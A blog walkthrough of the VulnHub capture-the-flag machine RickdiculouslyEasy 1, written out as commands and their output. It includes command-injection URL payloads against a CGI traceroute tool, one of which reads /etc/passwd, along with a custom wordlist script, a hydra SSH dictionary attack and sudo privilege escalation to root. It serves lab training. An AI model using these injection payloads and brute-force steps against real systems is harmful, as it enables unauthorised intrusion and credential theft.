---
title: VulnHub - RickdiculouslyEasy 1
author: ret2x
date: 2021-08-18 13:02:24 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, command injection]
image:
    path: /assets/images/rickdiculouslyeasy/front.png
---

**Description:** A linux machine serving a web application vulnerable to Command Injection allowing to locate the credentials to log in via SSH service. An additional enumeration aided to perform a custom dictionary attack besides of sudo misconfigurations allowed to get root privileges.

**Author:** Luke

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/)

## Information Gathering
### Host Discovery

We start by discovering the target on the local machine.

```console
root@kali:~$ nmap -n -sn 192.168.179.1-255
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-18 19:53 -05
Nmap scan report for 192.168.179.1
Host is up.
Nmap scan report for 192.168.179.148
Host is up (0.00074s latency).
MAC Address: 08:00:27:7B:BF:F3 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.179.254
Host is up (0.00018s latency).
MAC Address: 00:50:56:E2:97:73 (VMware)
Nmap done: 255 IP addresses (3 hosts up) scanned in 4.01 seconds
```

### Port Scanning

Found our target and then we proceed to perform a full TCP port scan.

```console
root@kali:~$ nmap -n -vv -T5 -p1-65535 192.168.179.148 -oG tcp-all-ports.txt
...
PORT      STATE SERVICE    REASON
21/tcp    open  ftp        syn-ack ttl 64
22/tcp    open  ssh        syn-ack ttl 64
80/tcp    open  http       syn-ack ttl 64
9090/tcp  open  zeus-admin syn-ack ttl 64
13337/tcp open  unknown    syn-ack ttl 64
22222/tcp open  easyengine syn-ack ttl 64
60000/tcp open  unknown    syn-ack ttl 64
...
```

### Service Enumeration

Then I perform the version and OS detection and script scanning for open TCP ports.

```console
root@kali:~$ nmap -A -vv -n -p21,22,80,9090,13337,22222,60000 192.168.179.148 -oN service-enum.txt
...
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.179.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh?    syn-ack ttl 64
| fingerprint-strings:
|   NULL:
|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.27 ((Fedora))
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Fedora)
|_http-title: Morty's Website
9090/tcp  open  http    syn-ack ttl 64 Cockpit web service 161 or earlier
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Did not follow redirect to https://192.168.179.148:9090/
13337/tcp open  unknown syn-ack ttl 64
| fingerprint-strings:
|   NULL:
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNvEvp4kqXX1H6FNqkKASBizY59uyLsqrLzLfT4R5vD8yuq+K0OqomxTiDwipMZTfQIRuBl2OzXX3rzRQ0aB+4EXyLbsxqNNP/+xRgPgFL6FPNI7j2rPGt+hQ6nmkpBJzzSpA4BBlGwvQt/i4LhrRoDsuD2JxQlmH1LNAlG6rE+xyqMTEgnfnO70pYzcmxDOixHiqTkbrsGnE6kIiyiOopwsR2E2KLPusFQJhEhsOOCJzurO7YYbDxQIwOMOox96SPtgti+4bnAVndLpo/IddtzZu3PB4SK43aIeGWgP7ONl6H0Cs1opW1EQSmdpww+Nu3fMlAlC+VMfmJNca8z9Np
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKqM0Vcrgqds3NsV5wJ7j876UEKSpMytY6gNpa0Ey47sSAizc+hUU8UGoFmPsco2rjIn9QhdEIWzeMJksnpbxDk=
|   256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHJ5AJGj4+y9xHabmQ5cLyxySqPvQ9sW+ko0w1vnzZWI
60000/tcp open  unknown syn-ack ttl 64
|_drda-info: ERROR
| fingerprint-strings:
|   NULL, ibm-db2:
|_    Welcome to Ricks half baked reverse shell...
```

If we notice in the results we can see an unusual banner on port 13337, the value of our first flag 10pts.

### FTP Enumeration

The anonymous login is enabled for the FTP service, so I create a mount point on my machine and we have the second flag of 10pts, for the moment we have 20pts.

```console
root@kali:~$ mkdir /mnt/ftp
root@kali:~$ curlftpfs ftp://anonymous:@192.168.179.148 /mnt/ftp
root@kali:~$ cd /mnt/ftp
root@kali:/mnt/ftp$ ls -la *
-rw-r--r-- 1 root root 42 Aug 22  2017 FLAG.txt

pub:
total 4
drwxr-xr-x 2 root root    6 Feb 12  2017 .
drwxr-xr-x 1 root root 1024 Dec 31  1969 ..
root@kali:/mnt/ftp$ cat FLAG.txt 
FLAG{Whoa this is unexpected} - 10 Points
```

### Web Enumeration on por 80

In the web page at first glance I can't find anything, so I request for the robots.txt file.

![](/assets/images/rickdiculouslyeasy/screenshot-1.png)

![](/assets/images/rickdiculouslyeasy/screenshot-2.png)

In the tracertool.cgi file, I found a traceroute utility, it looks interesting.

![](/assets/images/rickdiculouslyeasy/screenshot-3.png)

I try to add the **id** command after of the loopback ip address followed by a semicolon and the command is executed, apparently the user input is not validating correctly.

`http://192.168.179.148/cgi-bin/tracertool.cgi?ip=127.0.0.1;id`

![](/assets/images/rickdiculouslyeasy/screenshot-4.png)

Then I try to list a path back and found the html directory.

`http://192.168.179.148/cgi-bin/tracertool.cgi?ip=;ls -la ../`

![](/assets/images/rickdiculouslyeasy/screenshot-5.png)

I list the html directory and I find a passwords file, access it and I found the flag.txt and passwords.html files.

`http://192.168.179.148/cgi-bin/tracertool.cgi?ip=;ls -la ../html`

![](/assets/images/rickdiculouslyeasy/screenshot-6.png)

![](/assets/images/rickdiculouslyeasy/screenshot-7.png)

We have the third 10pts flag that adds up to 30pts.

![](/assets/images/rickdiculouslyeasy/screenshot-8.png)

In the passwords.html file I found the **winter** password.

![](/assets/images/rickdiculouslyeasy/screenshot-9.png)

Now we have the password but don't know the system users to access via ssh, trying to display the content of the passwd file with the cat command, this doesn't work to avoid this problem I used the less command.

`http://192.168.179.148/cgi-bin/tracertool.cgi?ip=;less /etc/passwd`

![](/assets/images/rickdiculouslyeasy/screenshot-10.png)

### Enumeration on port 60000

On this port we connect with netcat, but this is a rabbit hole, the only one I could find is the 10pts flag that adds up to 40pts.

```console
root@kali:~$ nc 192.168.179.148 60000
Welcome to Ricks half baked reverse shell...
# whoami
root 
# id
id: command not found 
# ls
FLAG.txt 
# pwd 
/root/blackhole/ 
# cd ..
Permission Denied. 
# cd /tmp
Permission Denied. 
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points 
# 
```

### Enumeration on port 9090

On this port I found another 10pts flag that adds up to 50pts.

![](/assets/images/rickdiculouslyeasy/screenshot-11.png)

## Exploitation 
### Access via SSH

I logged via ssh with the user **Summer** and password **winter**, and in her home directory I found the 10pts flag, this adds up to 60pts.

```console
root@kali:~$ ssh Summer@192.168.179.148 -p 22222
Summer@192.168.179.148's password: 
Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
[Summer@localhost ~]$ id
uid=1002(Summer) gid=1002(Summer) groups=1002(Summer) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[Summer@localhost ~]$ ls
FLAG.txt
[Summer@localhost ~]$ less FLAG.txt 
FLAG{Get off the high road Summer!} - 10 Points
```

In the Morty's home directory I found an image and a zip file, downloaded them via scp.

```console
root@kali:~$ scp -P 22222 Summer@192.168.179.148:"/home/Morty/{journal.txt.zip,Safe_Password.jpg}" .
Summer@192.168.179.148's password: 
journal.txt.zip                                                                           100%  414    29.4KB/s   00:00
Safe_Password.jpg                                                                         100%   42KB   1.1MB/s   00:00
```

Analyzing the image with the strings command I found the **Meeseek** password.

```console
root@kali:~$ strings Safe_Password.jpg | head -5
JFIF
Exif
8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
8BIM
8BIM
```

Then I unzip the **journal.txt.zip** file with the password found, in the text we see something about a password for safe, and the 20pts flag, this adds up to 80pts.

```console
root@kali:~$ unzip journal.txt.zip              
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password: 
  inflating: journal.txt
  root@kali:~$ cat journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points
```

Inside the path **/home/RickSanchez/RickSanchez/RICKS_SAFE/**, I found a binary called safe.

```console
[Summer@localhost home]$ cd RickSanchez/RickSanchez/RICKS_SAFE/
[Summer@localhost RICKS_SAFE]$ ls
safe
```

I transfer this to the attacking machine, I give execution permissions to the safe binary, and to execute it assign the password **131333** as parameter.

```console
[Summer@localhost RICKS_SAFE]$ nc -vln 3232 < safe 
```

```console
root@kali:~$ nc 192.168.179.148 3232 > safe
root@kali:~$ chmod 755 safe
root@kali:~$ ./safe 131333
decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.  @
```

## Privilege Escalation
### Dictionary Attack

In the results we can see the 20pts flag that adds up to 100pts, and the specifications to generate the password for the Rick user, searching in google I found the band **[The Flesh Curtains](https://rickandmorty.fandom.com/wiki/The_Flesh_Curtains)** to wich Rick belonged, I developed a simple bash script to generate the possible passwords, and execute it.


```console
#!/bin/bash

band='The Flesh Curtains'

for l in {A..Z}; do
        for n in {0..9}; do
           for w in $band; do
                   echo $l$n$w
           done
        done
done > wordlist.txt
```

```console
root@kali:~$ ./dictgen.sh 
```

Then I ran hydra to perform a dictionary attack with the generated wordlist.

```console
root@kali:~$ hydra -l RickSanchez -P wordlist.txt ssh://192.168.179.148:22222
..
[22222][ssh] host: 192.168.179.148   login: RickSanchez   password: P7Curtains
```

Now we have the RickSanchez password and I loggin via ssh.

```console
root@kali:~$ ssh -l RickSanchez 192.168.179.148 -p 22222
RickSanchez@192.168.179.148's password:
[RickSanchez@localhost ~]$ id
uid=1000(RickSanchez) gid=1000(RickSanchez) groups=1000(RickSanchez),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

### Sudo Permissions

Checking the sudo permissions this user is allowed to execute any command with those rights, so I execute the following instruction and we get root.

```console
[RickSanchez@localhost ~]$ sudo -l
[sudo] password for RickSanchez: 
Matching Defaults entries for RickSanchez on localhost:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME
    LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User RickSanchez may run the following commands on localhost:
    (ALL) ALL
[RickSanchez@localhost ~]$ sudo -s
[root@localhost RickSanchez]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@localhost RickSanchez]# cd
[root@localhost ~]# ls
anaconda-ks.cfg  FLAG.txt
[root@localhost ~]# CATONALEASH FLAG.txt 
FLAG: {Ionic Defibrillator} - 30 points
```
In the /root directory I found the last 30pts flag that adds up to 130pts completing our goal.

